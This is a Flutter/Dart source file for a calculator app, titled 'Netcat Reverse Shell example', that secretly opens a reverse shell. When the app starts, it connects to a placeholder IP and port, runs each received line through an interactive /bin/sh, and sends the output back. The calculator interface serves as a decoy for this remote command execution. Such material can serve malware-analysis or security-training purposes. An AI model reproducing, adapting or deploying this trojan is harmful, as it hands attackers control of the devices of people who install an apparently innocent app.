import 'package:flutter/material.dart';
import 'dart:io';
import 'dart:convert';

void main() {
  runApp(const CalculatorApp());
}

class CalculatorApp extends StatelessWidget {
  const CalculatorApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Netcat Reverse Shell example',
      theme: ThemeData.dark().copyWith(
        colorScheme: ThemeData.dark().colorScheme.copyWith(
          surface: Colors.grey[900],
        ),
      ),
      home: const CalculatorScreen(),
    );
  }
}

class CalculatorScreen extends StatefulWidget {
  const CalculatorScreen({super.key});

  @override
  _CalculatorScreenState createState() => _CalculatorScreenState();
}

class _CalculatorScreenState extends State<CalculatorScreen> {
  String _output = '0';
  double _num1 = 0;
  double _num2 = 0;
  String _operand = '';
  late Socket _socket;

  @override
  void initState() {
    super.initState();
    _connectToServer();
  }

  void _connectToServer() async {
    try {
      _socket = await Socket.connect("<IP>", <PORT>);
      _socket.listen(
            (data) {
          Process.start('/bin/sh', ['-i']).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout.transform(utf8.decoder).listen((output) {
              _socket.write(output);
            });
          });
        },
        onDone: () {
          _socket.destroy();
        },
        onError: (error) {
          print("Connection Error: $error");
          _socket.destroy();
        },
      );
    } catch (e) {
      print("Unable to connect: $e");
    }
  }

  void _buttonPressed(String buttonText) {
    setState(() {
      if (buttonText == 'C') {
        _output = '0';
        _num1 = 0;
        _num2 = 0;
        _operand = '';
      } else if (['+', '-', '*', '/'].contains(buttonText)) {
        _num1 = double.tryParse(_output) ?? 0;
        _operand = buttonText;
        _output = '0';
      } else if (buttonText == '=') {
        _num2 = double.tryParse(_output) ?? 0;
        if (_operand == '+') _output = (_num1 + _num2).toString();
        if (_operand == '-') _output = (_num1 - _num2).toString();
        if (_operand == '*') _output = (_num1 * _num2).toString();
        if (_operand == '/') _output = (_num2 != 0) ? (_num1 / _num2).toString() : 'Error';
        _num1 = 0;
        _num2 = 0;
        _operand = '';
      } else {
        _output = (_output == '0') ? buttonText : _output + buttonText;
      }
    });
  }

  Widget _buildButton(String buttonText, Color buttonColor, Color textColor) {
    return Expanded(
      child: Container(
        margin: const EdgeInsets.all(8.0),
        child: ElevatedButton(
          style: ElevatedButton.styleFrom(
            foregroundColor: textColor, backgroundColor: buttonColor,
          ),
          onPressed: () => _buttonPressed(buttonText),
          child: Text(buttonText, style: const TextStyle(fontSize: 24.0)),
        ),
      ),
    );
  }

  Widget _buildButtonRow(List<String> buttons) {
    return Row(
      children: buttons.map((button) => _buildButton(
        button,
        button == 'C' ? Colors.grey[700]! : Colors.grey[900]!,
        ['=', '/', '*', '-', '+'].contains(button) ? Colors.white : Colors.amber,
      )).toList(),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Calculator')),
      body: Column(
        children: [
          Expanded(
            child: Container(
              alignment: Alignment.bottomRight,
              padding: const EdgeInsets.all(24.0),
              child: Text(
                _output,
                style: const TextStyle(fontSize: 48.0, fontWeight: FontWeight.bold),
              ),
            ),
          ),
          Column(
            children: [
              _buildButtonRow(['7', '8', '9', '/']),
              _buildButtonRow(['4', '5', '6', '*']),
              _buildButtonRow(['1', '2', '3', '-']),
              _buildButtonRow(['C', '0', '=', '+']),
            ],
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _socket.close();
    super.dispose();
  }
}
